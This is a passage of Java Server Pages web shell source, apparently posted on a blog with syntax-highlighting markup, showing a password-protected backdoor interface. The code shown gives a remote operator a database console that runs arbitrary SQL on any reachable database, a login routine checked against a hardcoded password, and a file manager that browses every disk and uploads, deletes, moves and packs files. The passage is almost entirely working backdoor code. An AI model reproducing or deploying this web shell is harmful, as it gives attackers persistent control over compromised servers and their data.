method=\"</span>post\<span class="string">" &gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input type=\"</span>hidden\<span class="string">" id=\"</span>selectDb\<span class="string">" name=\"</span>selectDb\<span class="string">" value=\""+selectDb+"</span>\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;h2&gt;DataBase Manager &amp;raquo;&lt;/h2&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input id=\"</span>action\<span class="string">" type=\"</span>hidden\<span class="string">" name=\"</span>o\<span class="string">" value=\"</span>dbc\<span class="string">" /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"Driver:"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;input class=\"</span>input\<span class="string">" name=\"</span>driver\<span class="string">" value=\""+Ddbo.driver+"</span>\<span class="string">" id=\"</span>driver\<span class="string">" type=\"</span>text\<span class="string">" size=\"</span><span class="number">35</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"URL:"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input class=\"</span>input\<span class="string">" name=\"</span>url\<span class="string">" value=\""+Ddbo.url+"</span>\<span class="string">" id=\"</span>url\<span class="string">" value=\"</span>\<span class="string">" type=\"</span>text\<span class="string">" size=\"</span><span class="number">90</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"UID:"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input class=\"</span>input\<span class="string">" name=\"</span>uid\<span class="string">" value=\""+Ddbo.uid+"</span>\<span class="string">" id=\"</span>uid\<span class="string">" value=\"</span>\<span class="string">" type=\"</span>text\<span class="string">" size=\"</span><span class="number">10</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"PWD:"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input class=\"</span>input\<span class="string">" name=\"</span>pwd\<span class="string">" value=\""+Ddbo.pwd+"</span>\<span class="string">" id=\"</span>pwd\<span class="string">" value=\"</span>\<span class="string">" type=\"</span>text\<span class="string">" size=\"</span><span class="number">10</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"DataBase:"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">" &lt;select onchange='changeurldriver()' class=\"</span>input\<span class="string">" id=\"</span>db\<span class="string">" name=\"</span>db\<span class="string">" &gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">" &lt;option value='com.mysql.jdbc.Driver`jdbc:mysql://localhost:3306/mysql?useUnicode=true&amp;characterEncoding=GBK'&gt;Mysql&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">" &lt;option value='oracle.jdbc.driver.OracleDriver`jdbc:oracle:thin:@dbhost:1521:ORA1'&gt;Oracle&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">" &lt;option value='com.microsoft.jdbc.sqlserver.SQLServerDriver`jdbc:microsoft:sqlserver://localhost:1433;DatabaseName=master'&gt;Sql Server&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">" &lt;option value='sun.jdbc.odbc.JdbcOdbcDriver`jdbc:odbc:Driver=&#123;Microsoft Access Driver (*.mdb)&#125;;DBQ=C:/ninty.mdb'&gt;Access&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">" &lt;option value=' ` '&gt;Other&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">" &lt;/select&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input class=\"</span>bt\<span class="string">" name=\"</span>connect\<span class="string">" id=\"</span>connect\<span class="string">" value=\"</span>Connect\<span class="string">" type=\"</span>submit\<span class="string">" size=\"</span><span class="number">100</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/form&gt;&lt;script&gt;changeurldriver('"</span>+selectDb+<span class="string">"')&lt;/script&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;form action=\""+SHELL_NAME+"</span>\<span class="string">" method=\"</span>POST\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;p&gt;&lt;input type=\"</span>hidden\<span class="string">" name=\"</span>selectDb\<span class="string">" value=\""+selectDb+"</span>\<span class="string">"&gt;&lt;input type=\"</span>hidden\<span class="string">" name=\"</span>o\<span class="string">" value=\"</span>executesql\<span class="string">"&gt;&lt;table width=\"</span><span class="number">200</span>\<span class="string">" border=\"</span><span class="number">0</span>\<span class="string">" cellpadding=\"</span><span class="number">0</span>\<span class="string">" cellspacing=\"</span><span class="number">0</span>\<span class="string">"&gt;&lt;tr&gt;&lt;td colspan=\"</span><span class="number">2</span>\<span class="string">"&gt;Run SQL query/queries on database :&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;textarea name=\"</span>sql\<span class="string">" class=\"</span>area\<span class="string">" style=\"</span>width:<span class="number">600</span>px;height:<span class="number">50</span>px;overflow:auto;\<span class="string">"&gt;"</span>+Util.htmlEncode(Util.getStr(sql))+<span class="string">"&lt;/textarea&gt;&lt;/td&gt;&lt;td style=\"</span>padding:<span class="number">0</span> <span class="number">5</span>px;\<span class="string">"&gt;&lt;input class=\"</span>bt\<span class="string">" style=\"</span>height:<span class="number">50</span>px;\<span class="string">" name=\"</span>submit\<span class="string">" type=\"</span>submit\<span class="string">" value=\"</span>Query\<span class="string">" /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;&lt;/form&gt;&lt;/table&gt;"</span>);	</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">//e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> ExecuteSQLInvoker extends DefaultInvoker&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> sql = <span class="built_in">request</span>.getParameter(<span class="string">"sql"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> db = <span class="built_in">request</span>.getParameter(<span class="string">"selectDb"</span>);</span></span><br><span class="line"><span class="vbscript">Object dbo = JSession.getAttribute(DBO);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!Util.<span class="built_in">isEmpty</span>(sql)) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (dbo == <span class="literal">null</span> || !((DBOperator)dbo).isValid()) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=vConn"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">ins.<span class="keyword">get</span>(<span class="string">"dbc"</span>).invoke(<span class="built_in">request</span>,<span class="built_in">response</span>,JSession);</span></span><br><span class="line"><span class="vbscript">Object obj = ((DBOperator)dbo).<span class="keyword">execute</span>(sql);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (obj instanceof ResultSet) &#123;</span></span><br><span class="line"><span class="vbscript">ResultSet rs = (ResultSet)obj;</span></span><br><span class="line"><span class="vbscript">ResultSetMetaData meta = rs.getMetaData();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">int</span> colCount = meta.getColumnCount();</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;div style='padding:10px'&gt;&lt;p&gt;&lt;b&gt;Query#0 : "</span>+Util.htmlEncode(sql)+<span class="string">"&lt;/b&gt;&lt;/p&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;table border=\"</span><span class="number">0</span>\<span class="string">" cellpadding=\"</span><span class="number">3</span>\<span class="string">" cellspacing=\"</span><span class="number">0</span>\<span class="string">"&gt;&lt;tr class=\"</span>head\<span class="string">"&gt;"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">for</span> (<span class="built_in">int</span> i=<span class="number">1</span>;i&lt;=colCount;i++) &#123;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;td nowrap&gt;"</span>+meta.getColumnName(i)+<span class="string">"&lt;br&gt;&lt;span&gt;"</span>+meta.getColumnTypeName(i)+<span class="string">"&lt;/span&gt;&lt;/td&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;/tr&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">Table tb = <span class="keyword">new</span> Table();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span>(rs.<span class="keyword">next</span>()) &#123;</span></span><br><span class="line"><span class="vbscript">Row r = <span class="keyword">new</span> Row();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">1</span>;i&lt;=colCount;i++) &#123;</span></span><br><span class="line"><span class="vbscript">r.addColumn(<span class="keyword">new</span> Column(rs.getString(i)));</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">tb.addRow(r);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">out.println(tb.toString());</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;/table&gt;&lt;/div&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">rs.close();</span></span><br><span class="line"><span class="vbscript">((DBOperator)dbo).closeStmt();</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;div style='margin:10px'&gt;&lt;h2&gt;affected rows : &lt;b&gt;"</span>+obj+<span class="string">"&lt;/b&gt;&lt;/h2&gt;&lt;/div&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">ins.<span class="keyword">get</span>(<span class="string">"dbc"</span>).invoke(<span class="built_in">request</span>,<span class="built_in">response</span>,JSession);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> VLoginInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore() &#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;style type=\"</span>text/css\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	input &#123;font:11px Verdana;BACKGROUND: #FFFFFF;height: 18px;border: 1px solid #666666;&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"a&#123;font:11px Verdana;BACKGROUND: #FFFFFF;&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	&lt;/style&gt;&lt;form method=\"</span>POST\<span class="string">" action=\""+SHELL_NAME+"</span>\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	  &lt;p&gt;&lt;span style=\"</span>font:<span class="number">11</span>px Verdana;\<span class="string">"&gt;Password: &lt;/span&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"        &lt;input name=\"</span>o\<span class="string">" type=\"</span>hidden\<span class="string">" value=\"</span>login\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"        &lt;input name=\"</span>pw\<span class="string">" type=\"</span>password\<span class="string">" size=\"</span><span class="number">20</span>\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"        &lt;input type=\"</span>hidden\<span class="string">" name=\"</span>o\<span class="string">" value=\"</span>login\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"        &lt;input type=\"</span>submit\<span class="string">" value=\"</span>Login\<span class="string">"&gt;&lt;br/&gt;&lt;br/&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	  "</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;span style=\"</span>font:<span class="number">11</span>px Verdana;\<span class="string">"&gt;Copyright &amp;copy; 2009 NinTy &lt;/span&gt;&lt;a href=\"</span>http://www.forjj.com\<span class="string">" target=\"</span>_blank\<span class="string">"&gt;www.Forjj.com&lt;/a&gt;&lt;/p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"    &lt;/form&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> LoginInvoker extends DefaultInvoker&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore() &#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> inputPw = <span class="built_in">request</span>.getParameter(<span class="string">"pw"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(inputPw) || !inputPw.equals(PW)) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=vLogin"</span>);</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(PW_SESSION_ATTRIBUTE,inputPw);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=index"</span>);</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> MyComparator implements Comparator&lt;File&gt;&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> <span class="built_in">int</span> compare(File f1,File f2) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (f1 != <span class="literal">null</span> &amp;&amp; f2!= <span class="literal">null</span>) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (f1.isDirectory()) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (f2.isDirectory()) &#123;</span></span><br><span class="line"><span class="vbscript">return f1.getName().compareTo(f2.getName());</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">return <span class="number">-1</span>;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123; </span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (f2.isDirectory()) &#123;</span></span><br><span class="line"><span class="vbscript">return <span class="number">1</span>;</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">return  f1.getName().compareTo(f2.getName());</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">return <span class="number">0</span>;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> FileListInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception &#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> path = <span class="built_in">request</span>.getParameter(<span class="string">"folder"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(path))</span></span><br><span class="line"><span class="vbscript">path = JSession.getAttribute(CURRENT_DIR).toString();</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(CURRENT_DIR,Util.convertPath(path));</span></span><br><span class="line"><span class="vbscript">File file = <span class="keyword">new</span> File(path);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!file.exists()) &#123;</span></span><br><span class="line"><span class="vbscript">throw <span class="keyword">new</span> Exception(path+<span class="string">"Dont Exists !"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(CURRENT_DIR,path);</span></span><br><span class="line"><span class="vbscript">File[] list = file.listFiles();</span></span><br><span class="line"><span class="vbscript">Arrays.sort(list,<span class="keyword">new</span> MyComparator());</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;div style='margin:10px'&gt;"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> cr = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">cr = JSession.getAttribute(CURRENT_DIR).toString().substring(<span class="number">0</span>,<span class="number">3</span>);</span></span><br><span class="line"><span class="vbscript">&#125;catch(Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">cr = <span class="string">"/"</span>;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">File currentRoot = <span class="keyword">new</span> File(cr);</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;h2&gt;File Manager - Current disk &amp;quot;"</span>+(cr.indexOf(<span class="string">"/"</span>) == <span class="number">0</span>?<span class="string">"/"</span>:currentRoot.getPath())+<span class="string">"&amp;quot; total "</span>+Util.getSize(currentRoot.getTotalSpace(),<span class="comment">'G')+"&lt;/h2&gt;");</span></span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;form action=\""+SHELL_NAME+"</span>\<span class="string">" method=\"</span>post\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;table width=\"</span><span class="number">98</span>%\<span class="string">" border=\"</span><span class="number">0</span>\<span class="string">" cellpadding=\"</span><span class="number">0</span>\<span class="string">" cellspacing=\"</span><span class="number">0</span>\<span class="string">" style=\"</span>margin:<span class="number">10</span>px <span class="number">0</span>;\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;tr&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"    &lt;td nowrap&gt;Current Directory  &lt;input type=\"</span>hidden\<span class="string">" name=\"</span>o\<span class="string">" value=\"</span>filelist\<span class="string">"/&gt;&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	&lt;td width=\"</span><span class="number">98</span>%\<span class="string">"&gt;&lt;input class=\"</span>input\<span class="string">" name=\"</span>folder\<span class="string">" value=\""+JSession.getAttribute(CURRENT_DIR)+"</span>\<span class="string">" type=\"</span>text\<span class="string">" style=\"</span>width:<span class="number">100</span>%;margin:<span class="number">0</span> <span class="number">8</span>px;\<span class="string">"&gt;&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"    &lt;td nowrap&gt;&lt;input class=\"</span>bt\<span class="string">" value=\"</span>GO\<span class="string">" type=\"</span>submit\<span class="string">"&gt;&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;/tr&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/table&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/form&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;table width=\"</span><span class="number">98</span>%\<span class="string">" border=\"</span><span class="number">0</span>\<span class="string">" cellpadding=\"</span><span class="number">4</span>\<span class="string">" cellspacing=\"</span><span class="number">0</span>\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;form action=\""+SHELL_NAME+"</span>?o=upload\<span class="string">" method=\"</span>POST\<span class="string">" enctype=\"</span>multipart/form-data\<span class="string">"&gt;&lt;tr class=\"</span>alt1\<span class="string">"&gt;&lt;td colspan=\"</span><span class="number">7</span>\<span class="string">" style=\"</span>padding:<span class="number">5</span>px;\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;div style=\"</span>float:<span class="built_in">right</span>;\<span class="string">"&gt;&lt;input class=\"</span>input\<span class="string">" name=\"</span>file\<span class="string">" value=\"</span>\<span class="string">" type=\"</span>file\<span class="string">" /&gt; &lt;input class=\"</span>bt\<span class="string">" name=\"</span>doupfile\<span class="string">" value=\"</span>Upload\<span class="string">" type=\"</span>submit\<span class="string">" /&gt;&lt;/div&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;a href=\"</span>javascript:<span class="keyword">new</span> fso(&#123;path:<span class="comment">'"+Util.convertPath(WEB_ROOT)+"'&#125;).subdir()\"&gt;Web Root&lt;/a&gt;"+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">" | &lt;a href=\"</span>javascript:<span class="keyword">new</span> fso(&#123;path:<span class="comment">'"+Util.convertPath(SHELL_DIR)+"'&#125;).subdir()\"&gt;Shell Directory&lt;/a&gt;"+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">" | &lt;a href=\"</span>javascript:<span class="keyword">new</span> fso(&#123;&#125;).mkdir()\<span class="string">"&gt;New Directory&lt;/a&gt; | &lt;a href=\"</span>javascript:<span class="keyword">new</span> fso(&#123;&#125;).createFile()\<span class="string">"&gt;New File&lt;/a&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">" | "</span>);</span></span><br><span class="line"><span class="vbscript">File[] roots = file.listRoots();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>;i&lt;roots.length;i++) &#123;</span></span><br><span class="line"><span class="vbscript">File r = roots[i];</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;a href=\"</span>javascript:<span class="keyword">new</span> fso(&#123;path:<span class="comment">'"+Util.convertPath(r.getPath())+"'&#125;).subdir();\"&gt;Disk("+Util.convertPath(r.getPath())+")&lt;/a&gt;");</span></span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (i != roots.length <span class="number">-1</span>) &#123;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"|"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; </span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/tr&gt;&lt;/form&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;tr class=\"</span>head\<span class="string">"&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;td&gt;Name&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;td width=\"</span><span class="number">16</span>%\<span class="string">"&gt;Last Modified&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;td width=\"</span><span class="number">10</span>%\<span class="string">"&gt;Size&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;td width=\"</span><span class="number">20</span>%\<span class="string">"&gt;Read/Write/Execute&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;td width=\"</span><span class="number">22</span>%\<span class="string">"&gt;&amp;nbsp;&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/tr&gt;"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (file.getParent() != <span class="literal">null</span>) &#123;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;tr class=alt1&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;td align=\"</span>center\<span class="string">"&gt;&lt;font face=\"</span>Wingdings <span class="number">3</span>\<span class="string">" size=4&gt;=&lt;/font&gt;&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;td nowrap colspan=\"</span><span class="number">5</span>\<span class="string">"&gt;&lt;a href=\"</span>javascript:<span class="keyword">new</span> fso(&#123;path:<span class="comment">'"+Util.convertPath(file.getAbsolutePath())+"'&#125;).parent()\"&gt;Goto Parent&lt;/a&gt;&lt;/td&gt;"+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/tr&gt;"</span>);	</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">int</span> dircount = <span class="number">0</span>;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">int</span> filecount = <span class="number">0</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">for</span> (File f:list) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (f.isDirectory()) &#123;</span></span><br><span class="line"><span class="vbscript">dircount ++;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;tr class=\"</span>alt2\<span class="string">" onMouseOver=\"</span>this.className=<span class="comment">'focus';\" onMouseOut=\"this.className='alt2';\"&gt;"+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;td width=\"</span><span class="number">2</span>%\<span class="string">" nowrap&gt;&lt;font face=\"</span>wingdings\<span class="string">" size=\"</span><span class="number">3</span>\<span class="string">"&gt;0&lt;/font&gt;&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;td&gt;&lt;a href=\"</span>javascript:<span class="keyword">new</span> fso(&#123;path:<span class="comment">'"+Util.convertPath(f.getAbsolutePath())+"'&#125;).subdir()\"&gt;"+f.getName()+"&lt;/a&gt;&lt;/td&gt;"+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;td nowrap&gt;"</span>+Util.formatDate(f.lastModified())+<span class="string">"&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;td nowrap&gt;--&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;td nowrap&gt;"</span>+f.canRead()+<span class="string">" / "</span>+f.canWrite()+<span class="string">" / "</span>+f.canExecute()+<span class="string">"&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;td nowrap&gt;&lt;a href=\"</span>javascript:<span class="keyword">new</span> fso(&#123;path:<span class="comment">'"+Util.convertPath(f.getAbsolutePath())+"',filename:'"+f.getName()+"'&#125;).removedir()\"&gt;Del&lt;/a&gt; | &lt;a href=\"javascript:new fso(&#123;path:'"+Util.convertPath(f.getAbsolutePath())+"'&#125;).move()\"&gt;Move&lt;/a&gt; | &lt;a href=\"javascript:new fso(&#123;path:'"+Util.convertPath(f.getAbsolutePath())+"',filename:'"+f.getName()+"'&#125;).pack()\"&gt;Pack&lt;/a&gt;&lt;/td&gt;"+</span></span></span><br><span 